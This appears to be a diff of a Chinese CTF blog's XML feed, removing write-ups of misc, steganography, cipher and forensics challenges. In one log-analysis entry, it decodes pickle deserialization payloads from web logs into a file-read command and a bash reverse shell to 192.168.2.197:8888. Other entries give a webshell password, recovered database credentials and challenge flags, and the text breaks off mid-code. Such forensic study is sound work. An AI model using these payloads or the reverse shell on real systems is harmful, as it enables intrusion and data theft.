-      <url>/2023/09/01/%5BSWPU%202020%5D%E5%A5%97%E5%A8%83/</url>
-      
-        <content type="html"><![CDATA[<p>使用<code>binwalk</code>分离文件</p><p><img src="https://imag.keyblue.cn/imag/202308271106253.png" alt="image-20230827110617216"></p><p>分离出一个压缩包内含两个文件</p><p><img src="https://imag.keyblue.cn/imag/202308271109438.png" alt="image-20230827110902406"></p><p>打开txt文件发现内部是rc4密文<code>U2FsdGVkX19uI2lzmxYrQ9mc16y7la7qc7VTS8gLaUKa49gzXPclxRXVsRJxWz/p</code>，需要找到key</p><p><img src="https://imag.keyblue.cn/imag/202308271110484.png" alt="image-20230827111004446"></p><p>对swpu.xls解压，内部含有两个文件</p><p><img src="https://imag.keyblue.cn/imag/202308271112716.png" alt="image-20230827111208681"></p><p>解压rc4key.zip需要密码，esayrc4.xlsx无法再次解压，随即使用010打开查看，</p><p><img src="https://imag.keyblue.cn/imag/202308271114279.png" alt="image-20230827111437244"></p><p>拉到最后，发现密码为<code>6e4c834d77cba03af41e1562a5bce84e</code></p><p>使用在在线解密工具得到明文为<code>ef1a73d40977a49b99b871980f355757</code></p><p><img src="https://imag.keyblue.cn/imag/202308271116714.png" alt="image-20230827111624674"></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> WriteUp </category>
-          
-          <category> Misc </category>
-          
-      </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>[SWPU 2020]耗子尾汁</title>
-      <link href="/2023/09/01/%5BSWPU%202020%5D%E8%80%97%E5%AD%90%E5%B0%BE%E6%B1%81/"/>
-      <url>/2023/09/01/%5BSWPU%202020%5D%E8%80%97%E5%AD%90%E5%B0%BE%E6%B1%81/</url>
-      
-        <content type="html"><![CDATA[<p>上来先分离试试</p><p><img src="https://imag.keyblue.cn/imag/202308301022883.png" alt="image-20230830102234837"></p><p>打开其中一个压缩包，里面有flag.txt</p><p><img src="https://imag.keyblue.cn/imag/202308301023182.png" alt="image-20230830102319142"></p><p>这是一个错误的flag</p><p>在另一个压缩包含有一个视频文件</p><p><img src="https://imag.keyblue.cn/imag/202308301024886.png" alt="image-20230830102414856"></p><p>看来是个视频隐写</p><p>播放视频，暂停看到一串字符</p><p><img src="https://imag.keyblue.cn/imag/202308301025784.png" alt="image-20230830102550742"></p><p><code>c2lnbl9pbg==</code></p><p>使用工具解码<img src="https://imag.keyblue.cn/imag/202308301027011.png" alt="image-20230830102755978"></p><p>将视频再次分离</p><p><img src="https://imag.keyblue.cn/imag/202308301030639.png" alt="image-20230830103023591"></p><p>得到一个压缩包需要密码才能解压</p><p>于是把刚刚解码得到的字符串作为密码解压</p><p>打开解压后的文本文档</p><p><img src="https://imag.keyblue.cn/imag/202308301032566.png" alt="image-20230830103225517"></p><p>翻译注释：The last layer is the single table replacement password（ 最后一层是单表替换密码  ）</p><p>原密文为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R1pCVE9OUlhHVTNES05SWkdZWVRNUVJYSEEzVEtOUlVHNFpUT09KWEdFM0RLTlJZRzRaVE9RSlhHRTNEUU5aWkdaQkRNTlpXRzQzVEdOWlpHNDRUTVFaV0lJM1RNTlpXR1k0UT09PT0=</span><br></pre></td></tr></table></figure><p>base64解压一次得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GZBTONRXGU3DKNRZGYYTMQRXHA3TKNRUG4ZTOOJXGE3DKNRYG4ZTOQJXGE3DQNZZGZBDMNZWG43TGNZZG44TMQZWII3TMNZWGY4Q====</span><br></pre></td></tr></table></figure><p>base32解码一次得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6C76756569616B7875647379716568737A7168796B67677379796C6B767669</span><br></pre></td></tr></table></figure><p>ASCII解码得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lvueiakxudsyqehszqhykggsyylkvvi</span><br></pre></td></tr></table></figure><p>仿射密码解码得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagyouhavesignedinsuccessfully</span><br></pre></td></tr></table></figure><p>可以看到文本文件的文件名为19_20，仿射密码a和b的值也为19_20</p><p><img src="https://imag.keyblue.cn/imag/202308301101298.png" alt="image-20230830110155260"></p><p><img src="https://imag.keyblue.cn/imag/202308301102498.png" alt="image-20230830110213462"></p><p>需要注意的是经过仿射密码得到的字符串不能直接提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;you_have_signed_in_successfully&#125;</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> WriteUp </category>
-          
-          <category> Misc </category>
-          
-      </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>[SWPU 2020]找找吧</title>
-      <link href="/2023/09/01/%5BSWPU%202020%5D%E6%89%BE%E6%89%BE%E5%90%A7/"/>
-      <url>/2023/09/01/%5BSWPU%202020%5D%E6%89%BE%E6%89%BE%E5%90%A7/</url>
-      
-        <content type="html"><![CDATA[<p>题目的附件需要解压密码</p><p><img src="https://imag.keyblue.cn/imag/202308280843443.png" alt="image-20230828084348396"></p><p>使用binwalk分离无果</p><p>使用foremost分离无果</p><p>使用010打开附件，直接拉到最后，发现了key</p><p><img src="https://imag.keyblue.cn/imag/202308280851443.png" alt="image-20230828085125413"></p><p>压缩包内有一个mp3文件和一个压缩包，mp3文件使用Audacity打开，在音频的最后发现了像摩斯密码的内容</p><p><img src="https://imag.keyblue.cn/imag/202308280856684.png" alt="image-20230828085623626"></p><p><img src="https://imag.keyblue.cn/imag/202308280857191.png" alt="image-20230828085729160"></p><p>记录得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-.. ....- ...-- ----. -.... ...-- . ----. ..--- -... ----- .---- ..--- .- .- -...</span><br></pre></td></tr></table></figure><p>解码得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d43963e92b012aab</span><br></pre></td></tr></table></figure><p>用此字符串做压缩包密码，显示密码错误。</p><p>猜测可能是md5值，随机在线解密。得到明文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n1ce_try</span><br></pre></td></tr></table></figure><p>在线解密网站：<a href="https://www.somd5.com/">https://www.somd5.com/</a></p><p><img src="https://imag.keyblue.cn/imag/202308280908162.png" alt="image-20230828090823133"></p><p>解压缩得到两张图片</p><p><img src="https://imag.keyblue.cn/imag/202308280913593.png" alt="image-20230828091328566"></p><p>将gif图片使用movgear-gif打开，看到某一帧带有一串字符</p><p><img src="https://imag.keyblue.cn/imag/202308280917493.png" alt="image-20230828091736418"></p><p>识别到flag值</p><p><img src="https://imag.keyblue.cn/imag/202308280918288.png" alt="image-20230828091825248"></p><p>随即提交但是错误</p><p>似乎是凯撒密码，批量解密</p><p><img src="https://imag.keyblue.cn/imag/202308280955841.png" alt="image-20230828095511800"></p><p>得到flag值：sWpu_N1c3_Try</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> WriteUp </category>
-          
-          <category> Misc </category>
-          
-      </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>[SWPUCTF 2021 新生赛]我flag呢？</title>
-      <link href="/2023/09/01/%5BSWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B%5D%E6%88%91flag%E5%91%A2%EF%BC%9F/"/>
-      <url>/2023/09/01/%5BSWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B%5D%E6%88%91flag%E5%91%A2%EF%BC%9F/</url>
-      
-        <content type="html"><![CDATA[<p>打开文件</p><p><img src="https://imag.keyblue.cn/imag/202308311317637.png" alt="image-20230831131708601"></p><p>词频统计</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from collections import Counter</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">with open(&#x27;res/附件.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">    for line in f:</span><br><span class="line">        text = line</span><br><span class="line"></span><br><span class="line">text = re.findall(&quot;&#123;(.*?)&#125;&quot;, text)</span><br><span class="line">for i in text:</span><br><span class="line">    flag += i</span><br><span class="line">wordcount = Counter(flag.lower())</span><br><span class="line">wordcount = wordcount</span><br><span class="line">print(wordcount)</span><br><span class="line">for i in wordcount:</span><br><span class="line">    print(i[0], end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure><p>需要注意的是，题目给的文本是两行，我们把两行合并成一行保存后再运行脚本</p><p>运行脚本</p><p><img src="https://imag.keyblue.cn/imag/202308311343946.png" alt="image-20230831134334915"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yourflagis81e57d2bc90364t</span><br></pre></td></tr></table></figure><p>因为t只出现了一次</p><p>所以最后的flag为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;81e57d2bc90364&#125;</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> WriteUp </category>
-          
-          <category> Misc </category>
-          
-      </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>[SWPUCTF 2021 新生赛]gif好像有点大</title>
-      <link href="/2023/09/01/%5BSWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dgif%E5%A5%BD%E5%83%8F%E6%9C%89%E7%82%B9%E5%A4%A7/"/>
-      <url>/2023/09/01/%5BSWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dgif%E5%A5%BD%E5%83%8F%E6%9C%89%E7%82%B9%E5%A4%A7/</url>
-      
-        <content type="html"><![CDATA[<p>使用foremost和binwalk分离文件无果</p><p>010打开文件也没有发现什么有用的信息</p><p>随即使用Stegsolve.jar打开gif，选择frame browser模式</p><p><img src="https://imag.keyblue.cn/imag/202308271701553.png" alt="image-20230827170114514"></p><p>一个一共800多帧，在562帧发现一个二维码</p><p><img src="https://imag.keyblue.cn/imag/202308271704355.png" alt="image-20230827170409299"></p><p>使用微信或者<code>QR Research</code>扫码</p><p><img src="https://imag.keyblue.cn/imag/202308271703623.png" alt="image-20230827170317585"></p><p>得到flag值为NSS{The_G1F_ls_T00_b1g}</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> WriteUp </category>
-          
-          <category> Misc </category>
-          
-      </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>[SWPUCTF 2021 新生赛]原来你也玩原神</title>
-      <link href="/2023/09/01/%5BSWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B%5D%E5%8E%9F%E6%9D%A5%E4%BD%A0%E4%B9%9F%E7%8E%A9%E5%8E%9F%E7%A5%9E/"/>
-      <url>/2023/09/01/%5BSWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B%5D%E5%8E%9F%E6%9D%A5%E4%BD%A0%E4%B9%9F%E7%8E%A9%E5%8E%9F%E7%A5%9E/</url>
-      
-        <content type="html"><![CDATA[<p>压缩包解压错误</p><p>拖到kaili进行分离</p><p><img src="https://imag.keyblue.cn/imag/202308310952535.png" alt="image-20230831095217476"></p><p>什么也没分离出来</p><p>kali显示文件类型</p><p><img src="https://imag.keyblue.cn/imag/202308311013762.png" alt="image-20230831101327721"></p><p>发现是mp3格式文件</p><p>将文件后缀改为mp3，用Audacity打开</p><p><img src="https://imag.keyblue.cn/imag/202308311015777.png" alt="image-20230831101534739"></p><p>没有发现音频隐写</p><p>随即使用MP3Stego解码</p><p><img src="https://imag.keyblue.cn/imag/202308311016529.png" alt="image-20230831101640493"></p><p>打开分析出来的txt文本</p><p><img src="https://imag.keyblue.cn/imag/202308311017165.png" alt="image-20230831101725129"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">504b 0304 1400 0900 0800 6db2 3c53 1602</span><br><span class="line">0d75 3600 0000 7902 0000 0800 0000 7465</span><br><span class="line">7374 2e74 7874 edc4 410a 0010 1005 d0c3</span><br><span class="line">2976 3663 ff9b a428 8cc2 4272 7797 b0f4</span><br><span class="line">16cf 1229 a7ff ffb7 6f12 2c99 e0dc 052d</span><br><span class="line">f382 09b5 c754 914a 633f ce05 504b 0102</span><br><span class="line">3f00 1400 0000 0800 6db2 3c53 1602 0d75</span><br><span class="line">3600 0000 7902 0000 0800 2400 0000 0000</span><br><span class="line">0000 2000 0000 0000 0000 7465 7374 2e74</span><br><span class="line">7874 0a00 2000 0000 0000 0100 1800 054d</span><br><span class="line">41d7 73b4 d701 a780 52db 73b4 d701 cfdc</span><br><span class="line">aa53 73b4 d701 504b 0506 0000 0000 0100</span><br><span class="line">0100 5a00 0000 5c00 0000 0000</span><br></pre></td></tr></table></figure><p><img src="https://imag.keyblue.cn/imag/202308311019735.png" alt="image-20230831101949700"></p><p>发现是个zip压缩包，zip的文件头是<code>504b 0304</code></p><p>压缩包需要密码才能打开，猜测是个伪加密，改09为00</p><p><img src="https://imag.keyblue.cn/imag/202308311022721.png" alt="image-20230831102223698"></p><p>成功打开压缩包</p><p><img src="https://imag.keyblue.cn/imag/202308311023070.png" alt="image-20230831102310035"></p><p>flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;So_you_also_play_Genshin_impact&#125;</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> WriteUp </category>
-          
-          <category> Misc </category>
-          
-      </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>[蓝帽杯 2022 初赛]网站取证</title>
-      <link href="/2023/09/01/%5B%E8%93%9D%E5%B8%BD%E6%9D%AF%202022%20%E5%88%9D%E8%B5%9B%5D%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81/"/>
-      <url>/2023/09/01/%5B%E8%93%9D%E5%B8%BD%E6%9D%AF%202022%20%E5%88%9D%E8%B5%9B%5D%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81/</url>
-      
-        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">据了解，某网上商城系一团伙日常资金往来用，从2022年4月1日起使用虚拟币GG币进行交易，现已获得该网站的源代码以及部分数据库备份文件，请您对以下问题进行分析解答。</span><br></pre></td></tr></table></figure><h2 id="问1"><a href="#问1" class="headerlink" title="问1"></a>问1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请从网站源码中找出木马文件，并提交木马连接的密码。</span><br></pre></td></tr></table></figure><p>打开压缩包，是网站的根目录备份压缩包和sql备份文件。</p><p>我们直接解压压缩包，被火绒查杀出一个webshell</p><p><img src="https://imag.keyblue.cn/imag/202308301443483.png" alt="image-20230830144300440"></p><p>那么题目需要的木马文件应该就是它了</p><p>我们打开该文件</p><p><img src="https://imag.keyblue.cn/imag/202308301445852.png" alt="image-20230830144554819"></p><p>连接密码是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lanmaobei666</span><br></pre></td></tr></table></figure><h2 id="问2"><a href="#问2" class="headerlink" title="问2"></a>问2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请提交数据库连接的明文密码</span><br></pre></td></tr></table></figure><p>通过Seqy源码审计系统全局搜索password</p><p><img src="https://imag.keyblue.cn/imag/202308301503765.png" alt="image-20230830150325734"></p><p>点开第一个database.0.php,发现数据库用户名明文显示在此文件内，同时看到密码是由my_encrypt()函数决定的</p><p><img src="https://imag.keyblue.cn/imag/202308301504821.png" alt="image-20230830150448782"></p><p>追踪到my_encrypt()函数所在的文件</p><p><img src="https://imag.keyblue.cn/imag/202308301507686.png" alt="image-20230830150735660"></p><p>我们搭建一个php环境运行一下这个文件，同时输出密码</p><p><img src="https://imag.keyblue.cn/imag/202308301541360.png" alt="image-20230830154140311"></p><p><img src="https://imag.keyblue.cn/imag/202308301541375.png" alt="image-20230830154159345"></p><p>需要注意的是php环境版本不能高于7.1。因为代码中使用的mcrypt_module_open()函数在7.2版本被弃用了</p><p>明文密码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KBLT123</span><br></pre></td></tr></table></figure><h2 id="问3"><a href="#问3" class="headerlink" title="问3"></a>问3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请提交数据库金额加密混淆使用的盐值。</span><br></pre></td></tr></table></figure><p>全局搜索key</p><p><img src="https://imag.keyblue.cn/imag/202308301548623.png" alt="image-20230830154830593"></p><p>第一项内容似乎就是问题提到的盐值</p><p><img src="https://imag.keyblue.cn/imag/202308301549256.png" alt="image-20230830154947229"></p><p><em>题主似乎在说加盐最狗</em>🤣</p><p>盐值为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jyzg123456</span><br></pre></td></tr></table></figure><h2 id="问4"><a href="#问4" class="headerlink" title="问4"></a>问4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请计算张宝在北京时间2022-04-02 00:00:00-2022-04-18 23:59:59累计转账给王子豪多少RMB？（换算比例请从数据库中获取，答案参考格式：123.45）</span><br></pre></td></tr></table></figure><p>放着别做了😂浪费时间</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> WriteUp </category>
-          
-          <category> Misc </category>
-          
-      </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>[UTCTF 2020]Zero</title>
       <link href="/2023/09/01/%5BUTCTF%202020%5DZero/"/>
       <url>/2023/09/01/%5BUTCTF%202020%5DZero/</url>
       
         <content type="html"><![CDATA[<p>是零宽隐写</p><p><img src="https://imag.keyblue.cn/imag/202309011406892.png" alt="image-20230901140656857"></p><p><a href="https://www.mzy0.com/ctftools/zerowidth1/">零宽隐写在线解密</a></p><p>将文本复制到网站解密即可</p><p><img src="https://imag.keyblue.cn/imag/202309011406263.png" alt="image-20230901140642209"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utflag&#123;whyNOT@sc11_4927aajbqk14&#125;</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> WriteUp </category>
-          
-          <category> Misc </category>
-          
-      </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>[蓝帽杯 2022 初赛]计算机取证</title>
-      <link href="/2023/09/01/%5B%E8%93%9D%E5%B8%BD%E6%9D%AF%202022%20%E5%88%9D%E8%B5%9B%5D%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%81/"/>
-      <url>/2023/09/01/%5B%E8%93%9D%E5%B8%BD%E6%9D%AF%202022%20%E5%88%9D%E8%B5%9B%5D%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%81/</url>
-      
-        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">现对一个windows计算机进行取证，请您对以下问题进行分析解答。</span><br></pre></td></tr></table></figure><h2 id="问1"><a href="#问1" class="headerlink" title="问1"></a>问1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从内存镜像中获得taqi7的开机密码是多少？</span><br></pre></td></tr></table></figure><p><img src="https://imag.keyblue.cn/imag/202309011513162.png" alt="image-20230901151036671"></p><p>密文：<code>7f21caca5685f10d9e849cc84c340528</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">anxinqi</span><br></pre></td></tr></table></figure><h2 id="问2"><a href="#问2" class="headerlink" title="问2"></a>问2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">制作该内存镜像的进程Pid号是多少？</span><br></pre></td></tr></table></figure>]]></content>
       
       
       <categories>
@@ -508,32 +130,11 @@
     
     
     <entry>
-      <title>[陇剑杯 2021]SQL注入</title>
-      <link href="/2023/09/01/%5B%E9%99%87%E5%89%91%E6%9D%AF%202021%5DSQL%E6%B3%A8%E5%85%A5/"/>
-      <url>/2023/09/01/%5B%E9%99%87%E5%89%91%E6%9D%AF%202021%5DSQL%E6%B3%A8%E5%85%A5/</url>
+      <title>[SWPU 2019]Network</title>
+      <link href="/2023/08/31/%5BSWPU%202019%5DNetwork/"/>
+      <url>/2023/08/31/%5BSWPU%202019%5DNetwork/</url>
       
-        <content type="html"><![CDATA[<h2 id="问1"><a href="#问1" class="headerlink" title="问1"></a>问1</h2><p>明显的布尔盲注</p><h2 id="问2"><a href="#问2" class="headerlink" title="问2"></a>问2</h2><p>拉到日志最后</p><p><img src="https://imag.keyblue.cn/imag/202308271453488.png" alt="image-20230827145327453"></p><p>看到字段为flag，数据库为sqli，表为flag</p><h2 id="问3"><a href="#问3" class="headerlink" title="问3"></a>问3</h2><p>观察发现匹配到正确的字符时，响应的页面字符大小为<code>479|480|481|482</code>根据这个特征有此脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">with open(&#x27;res/access.log&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">    for line in f:</span><br><span class="line">        if re.search(&#x27;(select%20flag%20from%20sqli.flag)&#x27;, line):</span><br><span class="line">            if re.search(&#x27;479|480|481|482&#x27;, line):</span><br><span class="line">                line = re.findall(&quot;%20=%20&#x27;(.+)&#x27;,1,&quot;, line)[0]</span><br><span class="line">                flag += line</span><br><span class="line">                print(flag)</span><br></pre></td></tr></table></figure><p>最后得到flag值<code>flag&#123;deddcd67-bcfd-487e-b940-1217e668c7db&#125;</code></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> WriteUp </category>
-          
-          <category> Misc </category>
-          
-      </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>[陇剑杯 2021]简单日志分析</title>
-      <link href="/2023/09/01/%5B%E9%99%87%E5%89%91%E6%9D%AF%202021%5D%E7%AE%80%E5%8D%95%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
-      <url>/2023/09/01/%5B%E9%99%87%E5%89%91%E6%9D%AF%202021%5D%E7%AE%80%E5%8D%95%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
-      
-        <content type="html"><![CDATA[<h2 id="问1"><a href="#问1" class="headerlink" title="问1"></a>问1</h2><p>简单分析可知参数为<code>user</code></p><h2 id="问2"><a href="#问2" class="headerlink" title="问2"></a>问2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 - - [07/Aug/2021 10:43:12] &quot;GET /?user=STAKcDAKMFMnY2F0IC9UaDRzX0lTX1ZFUllfSW1wb3J0X0ZpMWUnCnAxCjAoZzAKbHAyCjAoSTAKdHAzCjAoZzMKSTAKZHA0CjBjb3MKc3lzdGVtCnA1CjBnNQooZzEKdFIu HTTP/1.1&quot; 500 -</span><br><span class="line"></span><br><span class="line">解密得到</span><br><span class="line">I0</span><br><span class="line">p0</span><br><span class="line">0S&#x27;cat /Th4s_IS_VERY_Import_Fi1e&#x27;</span><br><span class="line">p1</span><br><span class="line">0(g0</span><br><span class="line">lp2</span><br><span class="line">0(I0</span><br><span class="line">tp3</span><br><span class="line">0(g3</span><br><span class="line">I0</span><br><span class="line">dp4</span><br><span class="line">0cos</span><br><span class="line">system</span><br><span class="line">p5</span><br><span class="line">0g5</span><br><span class="line">(g1</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><p>所以黑客查看秘密文件的绝对路径为<code>/Th4s_IS_VERY_Import_Fi1e</code></p><h2 id="问3"><a href="#问3" class="headerlink" title="问3"></a>问3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 - - [07/Aug/2021 10:43:12] &quot;GET /?user=STAKcDAKMFMnYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjIuMTk3Lzg4ODggMD4mMScKcDEKMChnMApscDIKMChJMAp0cDMKMChnMwpJMApkcDQKMGNvcwpzeXN0ZW0KcDUKMGc1CihnMQp0Ui4= HTTP/1.1&quot; 500 -</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">解码得到</span><br><span class="line">I0</span><br><span class="line">p0</span><br><span class="line">0S&#x27;bash -i &gt;&amp; /dev/tcp/192.168.2.197/8888 0&gt;&amp;1&#x27;</span><br><span class="line">p1</span><br><span class="line">0(g0</span><br><span class="line">lp2</span><br><span class="line">0(I0</span><br><span class="line">tp3</span><br><span class="line">0(g3</span><br><span class="line">I0</span><br><span class="line">dp4</span><br><span class="line">0cos</span><br><span class="line">system</span><br><span class="line">p5</span><br><span class="line">0g5</span><br><span class="line">(g1</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><p>所以黑客反弹shell的ip和端口为192.168.2.197:8888</p>]]></content>
+        <content type="html"><![CDATA[<p>TTL隐写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IP报文在路由间穿梭的时候每经过一个路由，TTL就会减1，当TTL为0的时候，该报文就会被丢弃。</span><br><span class="line">TTL所占的位数是8位，也就是0-255的范围，但是在大多数情况下通常只需要经过很小的跳数就能完成报文的转发，</span><br><span class="line">远远比上限255小得多，所以我们可以用TTL值的前两位来进行传输隐藏数据。</span><br><span class="line">如：须传送H字符，只需把H字符换成二进制，每两位为一组，每次填充到TTL字段的开头两位并把剩下的6位设置为1（xx111111），这样发4个IP报文即可传送1个字节。</span><br></pre></td></tr></table></figure><p>根据上述规则，可以知道TTL隐写中用到四个值：<code>00 111111</code>（63）,<code>01 111111</code>（127）,<code>10 111111</code>（191）,<code>11 111111</code>（255）,解密的时候只取前两位，然后转换成ascii<br> 简化一下，可以这么认为：<br> 用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00 替换 63</span><br><span class="line">01 替换 127</span><br><span class="line">10 替换 191</span><br><span class="line">11 替换 255</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 